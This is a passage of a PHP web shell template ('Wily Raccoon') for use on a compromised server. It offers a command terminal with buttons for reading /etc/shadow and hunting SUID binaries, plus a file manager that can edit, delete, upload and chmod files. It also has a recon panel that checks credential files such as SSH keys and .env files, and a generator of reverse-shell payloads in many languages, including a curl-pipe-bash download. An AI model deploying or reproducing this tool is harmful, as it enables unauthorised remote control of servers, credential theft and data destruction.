    <button class="tab-btn <?php echo $activeTab === 'revshell' ? 'active' : ''; ?>" onclick="switchTab('revshell')">🔌 Reverse Shell</button>
    <button class="tab-btn <?php echo $activeTab === 'recon' ? 'active' : ''; ?>" onclick="switchTab('recon')">🔍 Recon</button>
</div>

<!-- ═══ TERMINAL TAB ═══ -->
<div class="tab-content <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" id="tab-terminal">

    <div class="terminal-banner">
 █     █░ ██▓ ██▓   ▓██   ██▓    ██▀███   ▄▄▄       ▄████▄   ▄████▄  ██▀███   ▒█████   ███▄    █
▓█░ █ ░█░▓██▒▓██▒    ▒██  ██▒   ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█  ▒██▀ ▀█ ▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █
▒█░ █ ░█ ▒██▒▒██░     ▒██ ██░   ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░     ░ ▐██▓░   ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒ ░ ██▒▓░   ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
░ ▓░▒ ▒  ░▓  ░ ▒░▓  ░  ██▒▒▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒
                              __W1ly_ra3cc00n__  |  Type 'help' for commands
    </div>

    <div class="output-area" id="output">
        <?php
        if (isset($_SESSION['cmd_history_display']) && !empty($_SESSION['cmd_history_display'])) {
            foreach ($_SESSION['cmd_history_display'] as $entry) {
                echo '<div>';
                echo '<span class="prompt-line">' . htmlspecialchars($entry['cwd']) . ' $</span>';
                echo ' <span class="cmd-text">' . htmlspecialchars($entry['cmd']) . '</span>';
                echo '</div>';
                if (!empty($entry['output'])) {
                    echo '<div class="result">' . htmlspecialchars($entry['output']) . '</div>';
                }
                echo '<br>';
            }
        }
        ?>
    </div>

    <div class="quick-actions">
        <button onclick="setCmd('whoami')">whoami</button>
        <button onclick="setCmd('id')">id</button>
        <button onclick="setCmd('pwd')">pwd</button>
        <button onclick="setCmd('ls -la')">ls -la</button>
        <button onclick="setCmd('uname -a')">uname</button>
        <button onclick="setCmd('cat /etc/passwd')">passwd</button>
        <button onclick="setCmd('cat /etc/shadow')">shadow</button>
        <button onclick="setCmd('netstat -tlnp')">netstat</button>
        <button onclick="setCmd('ss -tlnp')">ss</button>
        <button onclick="setCmd('ps aux')">procs</button>
        <button onclick="setCmd('df -h')">disk</button>
        <button onclick="setCmd('free -m')">memory</button>
        <button onclick="setCmd('ifconfig || ip addr')">network</button>
        <button onclick="setCmd('find / -perm -4000 -type f 2>/dev/null')">SUID</button>
        <button onclick="setCmd('find / -writable -type d 2>/dev/null | head -20')">writable</button>
        <button onclick="setCmd('crontab -l 2>/dev/null; ls -la /etc/cron*')">cron</button>
        <button onclick="setCmd('cat /etc/os-release')">os-info</button>
        <button onclick="setCmd('env')">env</button>
        <button onclick="setCmd('find . -name \"*.conf\" -o -name \"*.cfg\" -o -name \"*.ini\" 2>/dev/null')">configs</button>
        <button onclick="setCmd('history')">history</button>
        <button onclick="setCmd('sudo -l 2>/dev/null')">sudo -l</button>
        <button onclick="setCmd('sysinfo')">sysinfo</button>
        <button onclick="setCmd('help')">help</button>
    </div>

    <form method="POST" class="input-area" id="cmdForm">
        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
        <input type="hidden" name="tab" value="terminal">
        <span class="prompt"><?php echo htmlspecialchars($cwd); ?> $</span>
        <input type="text" name="cmd" id="cmdInput" placeholder="Enter command..." autofocus autocomplete="off">
        <button type="submit">▶ Run</button>
    </form>
</div>

<!-- ═══ FILE MANAGER TAB ═══ -->
<div class="tab-content <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" id="tab-filemanager">

    <?php
    $fm_cwd = isset($_POST['fm_path']) ? $_POST['fm_path'] : $cwd;
    if (!is_dir($fm_cwd)) $fm_cwd = $cwd;
    $editing_file = isset($_POST['edit_file']) ? $_POST['edit_file'] : null;
    ?>

    <?php if ($editing_file && file_exists($editing_file)): ?>
        <!-- FILE EDITOR -->
        <form method="POST" class="editor-area">
            <input type="hidden" name="tab" value="filemanager">
            <input type="hidden" name="action" value="savefile">
            <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($editing_file); ?>">
            <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>">
            <div class="editor-header">
                <span>Editing: <?php echo htmlspecialchars($editing_file); ?></span>
                <div>
                    <button type="submit" class="fm-btn" style="background:#ff0000;color:#000;">💾 Save</button>
                    <button type="button" class="fm-btn" onclick="switchTab('filemanager');location.reload();">✕ Close</button>
                </div>
            </div>
            <textarea class="editor-textarea" name="filecontent"><?php echo htmlspecialchars(@file_get_contents($editing_file)); ?></textarea>
        </form>

    <?php else: ?>
        <!-- FILE BROWSER -->
        <div class="fm-toolbar">
            <form method="POST" style="display:flex;gap:8px;flex:1;align-items:center;">
                <input type="hidden" name="tab" value="filemanager">
                <span style="color:#ff0000;font-size:12px;">📁</span>
                <input type="text" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>" style="flex:1;">
                <button type="submit">Go</button>
            </form>
            <form method="POST" style="display:flex;gap:5px;">
                <input type="hidden" name="tab" value="filemanager">
                <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>">
                <input type="hidden" name="action" value="mkdir">
                <input type="text" name="dirname" placeholder="New folder" style="width:120px;">
                <button type="submit">+📁</button>
            </form>
            <form method="POST" style="display:flex;gap:5px;">
                <input type="hidden" name="tab" value="filemanager">
                <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>">
                <input type="hidden" name="action" value="newfile">
                <input type="text" name="filename" placeholder="New file" style="width:120px;">
                <button type="submit">+📄</button>
            </form>
        </div>

        <?php if ($fm_message): ?>
            <div class="fm-message <?php echo strpos($fm_message, '✓') !== false ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($fm_message); ?>
            </div>
        <?php endif; ?>

        <div class="file-list">
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($fm_cwd !== '/'): ?>
                    <tr>
                        <td colspan="5">
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="tab" value="filemanager">
                                <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars(dirname($fm_cwd)); ?>">
                                <button type="submit" class="fname dir" style="background:none;border:none;cursor:pointer;font-family:'Courier New',monospace;font-size:12px;">📁 ..</button>
                            </form>
                        </td>
                    </tr>
                    <?php endif; ?>

                    <?php
                    $items = @scandir($fm_cwd);
                    if ($items) {
                        // Sort: directories first
                        $dirs = $files_arr = [];
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            $fullpath = rtrim($fm_cwd, '/') . '/' . $item;
                            if (is_dir($fullpath)) $dirs[] = $item;
                            else $files_arr[] = $item;
                        }
                        sort($dirs);
                        sort($files_arr);

                        foreach (array_merge($dirs, $files_arr) as $item):
                            $fullpath = rtrim($fm_cwd, '/') . '/' . $item;
                            $is_dir = is_dir($fullpath);
                            $is_link = is_link($fullpath);
                            $size = $is_dir ? '-' : formatBytes(@filesize($fullpath));
                            $perms = @getFilePermissions($fullpath);
                            $mtime = @date('Y-m-d H:i', filemtime($fullpath));
                            $css_class = $is_dir ? 'dir' : ($is_link ? 'link' : '');
                    ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="tab" value="filemanager">
                                    <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fullpath); ?>">
                                    <button type="submit" class="fname <?php echo $css_class; ?>" style="background:none;border:none;cursor:pointer;font-family:'Courier New',monospace;font-size:12px;">📁 <?php echo htmlspecialchars($item); ?></button>
                                </form>
                            <?php else: ?>
                                <span class="fname"><?php echo ($is_link ? '🔗 ' : '📄 ') . htmlspecialchars($item); ?></span>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $size; ?></td>
                        <td style="color:#666;"><?php echo $perms; ?></td>
                        <td><?php echo $mtime; ?></td>
                        <td>
                            <div class="file-actions">
                                <?php if (!$is_dir): ?>
                                    <!-- Edit -->
                                    <form method="POST" style="display:inline;">
                                        <input type="hidden" name="tab" value="filemanager">
                                        <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>">
                                        <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fullpath); ?>">
                                        <button type="submit" title="Edit">✏</button>
                                    </form>
                                    <!-- Download -->
                                    <form method="POST" style="display:inline;">
                                        <input type="hidden" name="tab" value="terminal">
                                        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                                        <input type="hidden" name="cmd" value="download <?php echo htmlspecialchars($fullpath); ?>">
                                        <button type="submit" title="Download">⬇</button>
                                    </form>
                                <?php endif; ?>
                                <!-- Delete -->
                                <form method="POST" style="display:inline;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($item); ?>?');">
                                    <input type="hidden" name="tab" value="filemanager">
                                    <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd); ?>">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="filepath" value="<?php echo htmlspecialchars($fullpath); ?>">
                                    <button type="submit" title="Delete" style="color:#ff4444;">✕</button>
                                </form>
                                <!-- Chmod -->
                                <button onclick="promptChmod('<?php echo htmlspecialchars($fullpath); ?>')" title="Chmod">🔐</button>
                                <!-- Rename -->
                                <button onclick="promptRename('<?php echo htmlspecialchars($fullpath); ?>')" title="Rename">✎</button>
                            </div>
                        </td>
                    </tr>
                    <?php
                        endforeach;
                    } else {
                        echo '<tr><td colspan="5" style="color:#ff4444;">Cannot read directory</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    <?php endif; ?>
</div>

<!-- ═══ REVERSE SHELL TAB ═══ -->
<div class="tab-content <?php echo $activeTab === 'revshell' ? 'active' : ''; ?>" id="tab-revshell">
    <div class="revshell-container">
        <div class="revshell-config">
            <div>
                <label>LHOST (Your IP):</label><br>
                <input type="text" id="lhost" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>" onchange="updatePayloads()">
            </div>
            <div>
                <label>LPORT:</label><br>
                <input type="text" id="lport" value="4444" onchange="updatePayloads()">
            </div>
        </div>

        <div id="payloads-container">
            <!-- Payloads generated by JS -->
        </div>
    </div>
</div>

<!-- ═══ RECON TAB ═══ -->
<div class="tab-content <?php echo $activeTab === 'recon' ? 'active' : ''; ?>" id="tab-recon">
    <div class="recon-container">
        <div class="recon-grid">
            <!-- System Info -->
            <div class="recon-card">
                <div class="recon-card-header">🖥 System Information</div>
                <div class="recon-card-body">
<span class="label">OS:</span> <span class="value"><?php echo php_uname(); ?></span>
<span class="label">Hostname:</span> <span class="value"><?php echo gethostname(); ?></span>
<span class="label">Kernel:</span> <span class="value"><?php echo php_uname('r'); ?></span>
<span class="label">Architecture:</span> <span class="value"><?php echo php_uname('m'); ?></span>
<span class="label">Current User:</span> <span class="value"><?php echo get_current_user() . ' (uid:' . getmyuid() . ' gid:' . getmygid() . ')'; ?></span>
<span class="label">Process ID:</span> <span class="value"><?php echo getmypid(); ?></span>
<span class="label">Server Time:</span> <span class="value"><?php echo date('Y-m-d H:i:s T'); ?></span>
                </div>
            </div>

            <!-- PHP Info -->
            <div class="recon-card">
                <div class="recon-card-header">🐘 PHP Configuration</div>
                <div class="recon-card-body">
<span class="label">Version:</span> <span class="value"><?php echo phpversion(); ?></span>
<span class="label">SAPI:</span> <span class="value"><?php echo php_sapi_name(); ?></span>
<span class="label">Safe Mode:</span> <span class="value"><?php echo getSafeMode(); ?></span>
<span class="label">Open Basedir:</span> <span class="value"><?php echo ini_get('open_basedir') ?: 'None'; ?></span>
<span class="label">Exec Methods:</span> <span class="value"><?php echo implode(', ', getAvailableExecMethods()) ?: 'None!'; ?></span>
<span class="label">Disabled:</span> <span class="value"><?php echo ini_get('disable_functions') ?: 'None'; ?></span>
<span class="label">Upload Max:</span> <span class="value"><?php echo ini_get('upload_max_filesize'); ?></span>
<span class="label">Memory Limit:</span> <span class="value"><?php echo ini_get('memory_limit'); ?></span>
<span class="label">Max Exec Time:</span> <span class="value"><?php echo ini_get('max_execution_time'); ?>s</span>
<span class="label">Loaded Exts:</span> <span class="value"><?php echo implode(', ', get_loaded_extensions()); ?></span>
                </div>
            </div>

            <!-- Server Info -->
            <div class="recon-card">
                <div class="recon-card-header">🌐 Server & Network</div>
                <div class="recon-card-body">
<span class="label">Server:</span> <span class="value"><?php echo getServerSoftware(); ?></span>
<span class="label">Doc Root:</span> <span class="value"><?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'N/A'; ?></span>
<span class="label">Script Path:</span> <span class="value"><?php echo __FILE__; ?></span>
<span class="label">Server IP:</span> <span class="value"><?php echo $_SERVER['SERVER_ADDR'] ?? @gethostbyname(gethostname()); ?></span>
<span class="label">Server Port:</span> <span class="value"><?php echo $_SERVER['SERVER_PORT'] ?? 'N/A'; ?></span>
<span class="label">Your IP:</span> <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span>
<span class="label">Protocol:</span> <span class="value"><?php echo isset($_SERVER['HTTPS']) ? 'HTTPS' : 'HTTP'; ?></span>
<span class="label">CWD:</span> <span class="value"><?php echo getcwd(); ?></span>
<span class="label">CWD Writable:</span> <span class="value"><?php echo is_writable(getcwd()) ? 'YES ✓' : 'NO ✕'; ?></span>
<span class="label">Temp Dir:</span> <span class="value"><?php echo sys_get_temp_dir(); ?></span>
<span class="label">Temp Writable:</span> <span class="value"><?php echo is_writable(sys_get_temp_dir()) ? 'YES ✓' : 'NO ✕'; ?></span>
                </div>
            </div>

            <!-- Interesting Files -->
            <div class="recon-card">
                <div class="recon-card-header">📂 Interesting Files Check</div>
                <div class="recon-card-body">
<?php
$interesting_files = [
    '/etc/passwd', '/etc/shadow', '/etc/hosts',
    '/etc/crontab', '/etc/ssh/sshd_config',
    '/root/.bash_history', '/root/.ssh/id_rsa',
    '/var/log/auth.log', '/var/log/apache2/error.log',
    '/etc/mysql/my.cnf', '/etc/nginx/nginx.conf',
    '/proc/version', '/etc/issue',
    '/etc/sudoers', '/var/www/html/wp-config.php',
    '/var/www/html/.env', '/.env',
];
foreach ($interesting_files as $f) {
    $readable = @is_readable($f);
    $exists = @file_exists($f);
    $icon = $readable ? '✅' : ($exists ? '🔒' : '❌');
    echo "$icon $f\n";
}
?>
                </div>
            </div>

            <!-- Writable Directories -->
            <div class="recon-card">
                <div class="recon-card-header">📝 Writable Directories</div>
                <div class="recon-card-body">
<?php
$check_dirs = ['/tmp', '/var/tmp', '/dev/shm', '/var/www', '/var/www/html',
    getcwd(), sys_get_temp_dir(), '/var/log', '/opt', '/home'];
foreach ($check_dirs as $d) {
    if (is_dir($d)) {
        $w = is_writable($d) ? '✅ WRITABLE' : '🔒 READ ONLY';
        echo "$w  $d\n";
    }
}
?>
                </div>
            </div>

            <!-- Database Detection -->
            <div class="recon-card">
                <div class="recon-card-header">🗄 Database Detection</div>
                <div class="recon-card-body">
<span class="label">MySQL:</span> <span class="value"><?php echo (extension_loaded('mysqli') || extension_loaded('pdo_mysql')) ? '✅ Available' : '❌ Not loaded'; ?></span>
<span class="label">PostgreSQL:</span> <span class="value"><?php echo extension_loaded('pgsql') ? '✅ Available' : '❌ Not loaded'; ?></span>
<span class="label">SQLite:</span> <span class="value"><?php echo extension_loaded('sqlite3') ? '✅ Available' : '❌ Not loaded'; ?></span>
<span class="label">MongoDB:</span> <span class="value"><?php echo extension_loaded('mongodb') ? '✅ Available' : '❌ Not loaded'; ?></span>
<span class="label">Redis:</span> <span class="value"><?php echo extension_loaded('redis') ? '✅ Available' : '❌ Not loaded'; ?></span>
<span class="label">Memcached:</span> <span class="value"><?php echo extension_loaded('memcached') ? '✅ Available' : '❌ Not loaded'; ?></span>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- ═══ UPLOAD MODAL ═══ -->
<div class="modal-overlay" id="uploadModal">
    <div class="modal-box">
        <h3>📤 Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="tab" value="<?php echo $activeTab; ?>">
            <input type="hidden" name="action" value="upload">
            <label style="color:#888;font-size:12px;">Upload to:</label>
            <input type="text" name="upload_dir" value="<?php echo htmlspecialchars($cwd); ?>" style="width:100%;padding:8px;background:#080808;border:1px solid #222;color:#ff0000;font-family:'Courier New',monospace;margin:5px 0;border-radius:4px;">
            <input type="file" name="uploadfile" required>
            <div class="modal-actions">
                <button type="submit" class="btn-primary">Upload</button>
                <button type="button" class="btn-secondary" onclick="document.getElementById('uploadModal').classList.remove('active')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- ═══ HIDDEN FORMS FOR FILE MANAGER ACTIONS ═══ -->
<form method="POST" id="chmodForm" style="display:none;">
    <input type="hidden" name="tab" value="filemanager">
    <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd ?? $cwd); ?>">
    <input type="hidden" name="action" value="chmod">
    <input type="hidden" name="filepath" id="chmodPath">
    <input type="hidden" name="newperms" id="chmodPerms">
</form>

<form method="POST" id="renameForm" style="display:none;">
    <input type="hidden" name="tab" value="filemanager">
    <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_cwd ?? $cwd); ?>">
    <input type="hidden" name="action" value="rename">
    <input type="hidden" name="oldname" id="renameOld">
    <input type="hidden" name="newname" id="renameNew">
</form>

<script>
// ═══ TAB SWITCHING ═══
function switchTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + tabName).classList.add('active');
    event.target.classList.add('active');
}

// ═══ TERMINAL ═══
const output = document.getElementById('output');
if (output) output.scrollTop = output.scrollHeight;

const cmdInput = document.getElementById('cmdInput');
if (cmdInput) cmdInput.focus();

function setCmd(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('cmdForm').submit();
}

// Command history
let cmdHistory = JSON.parse(localStorage.getItem('raccoonHistory') || '[]');
let histIdx = cmdHistory.length;

if (cmdInput) {
    cmdInput.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (histIdx > 0) { histIdx--; this.value = cmdHistory[histIdx]; }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (histIdx < cmdHistory.length - 1) { histIdx++; this.value = cmdHistory[histIdx]; }
            else { histIdx = cmdHistory.length; this.value = ''; }
        } else if (e.key === 'Tab') {
            e.preventDefault();
            // Basic tab completion hint
        }
    });
}

const cmdForm = document.getElementById('cmdForm');
if (cmdForm) {
    cmdForm.addEventListener('submit', function() {
        const cmd = cmdInput.value.trim();
        if (cmd) {
            cmdHistory.push(cmd);
            localStorage.setItem('raccoonHistory', JSON.stringify(cmdHistory.slice(-100)));
        }
    });
}

// ═══ FILE MANAGER ═══
function promptChmod(filepath) {
    const perms = prompt('Enter new permissions (e.g., 0755, 0644):', '0755');
    if (perms) {
        document.getElementById('chmodPath').value = filepath;
        document.getElementById('chmodPerms').value = perms;
        document.getElementById('chmodForm').submit();
    }
}

function promptRename(filepath) {
    const newName = prompt('Enter new name:', filepath.split('/').pop());
    if (newName) {
        const dir = filepath.substring(0, filepath.lastIndexOf('/') + 1);
        document.getElementById('renameOld').value = filepath;
        document.getElementById('renameNew').value = dir + newName;
        document.getElementById('renameForm').submit();
    }
}

// ═══ REVERSE SHELL PAYLOADS ═══
function updatePayloads() {
    const ip = document.getElementById('lhost').value;
    const port = document.getElementById('lport').value;
    const container = document.getElementById('payloads-container');

    const payloads = [
        {
            name: '🐚 Bash -i',
            cmd: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`
        },
        {
            name: '🐚 Bash UDP',
            cmd: `bash -i >& /dev/udp/${ip}/${port} 0>&1`
        },
        {
            name: '🐍 Python',
            cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
        },
        {
            name: '🐍 Python (Short)',
            cmd: `python3 -c 'import os;os.system("bash -c \\"bash -i >& /dev/tcp/${ip}/${port} 0>&1\\"")'`
        },
        {
            name: '💎 Perl',
            cmd: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`
        },
        {
            name: '🐘 PHP',
            cmd: `php -r '$sock=fsockopen("${ip}",${port});exec("sh <&3 >&3 2>&3");'`
        },
        {
            name: '🐘 PHP proc_open',
            cmd: `php -r '$s=fsockopen("${ip}",${port});$proc=proc_open("sh",array(0=>$s,1=>$s,2=>$s),$pipes);'`
        },
        {
            name: '💻 Netcat -e',
            cmd: `nc -e /bin/sh ${ip} ${port}`
        },
        {
            name: '💻 Netcat mkfifo',
            cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f`
        },
        {
            name: '💻 Netcat (BusyBox)',
            cmd: `busybox nc ${ip} ${port} -e sh`
        },
        {
            name: '☕ Java',
            cmd: `Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'"); p.waitFor();`
        },
        {
            name: '🌐 Node.js',
            cmd: `require('child_process').exec('bash -c "bash -i >& /dev/tcp/${ip}/${port} 0>&1"')`
        },
        {
            name: '💠 Ruby',
            cmd: `ruby -rsocket -e'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444444cd\\s+(.+)/444444)?Dir.chdir($1):(IO.popen($_,?r){|io|c.print io.read})}'`
        },
        {
            name: '🔧 Socat',
            cmd: `socat TCP:${ip}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`
        },
        {
            name: '🔧 Socat (TTY)',
            cmd: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`
        },
        {
            name: '⚡ PowerShell',
            cmd: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
        },
        {
            name: '🐚 Bash 196',
            cmd: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`
        },
        {
            name: '📡 cURL Based',
            cmd: `curl http://${ip}:${port}/shell.sh | bash`
        },
        {
            name: '🎯 Listener Command',
            cmd: `nc -lvnp ${port}`
        }
    ];

    container.innerHTML = payloads.map((p, i) => `
        <div class="payload-card">
            <div class="payload-header">
                <span>${p.name}</span>
                <button class="copy-btn" onclick="copyPayload(${i})">📋 Copy</button>
            </div>
            <div class="payload-body" id="payload-${i}">${escapeHtml(p.cmd)}</div>
        </div>
    `).join('');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function copyPayload(index) {
    const el = document.getElementById('payload-' + index);
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        const btns = document.querySelectorAll('.copy-btn');
        btns[index].textContent = '✅ Copied!';
        setTimeout(() => { btns[index].textContent = '📋 Copy'; }, 2000);
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
    });
}

// Initialize payloads
updatePayloads();

// ═══ KEYBOARD SHORTCUTS ═══
document.addEventListener('keydown', function(e) {
    // Ctrl+L = Clear
    if (e.ctrlKey && e.key === 'l') {
        e.preventDefault();
        setCmd('clear');
    }
    // Ctrl+K = Focus input
    if (e.ctrlKey && e.key === 'k') {
        e.preventDefault();
        if (cmdInput) cmdInput.focus();
    }
});
</script>

<?php endif; ?>
</body>
</html>
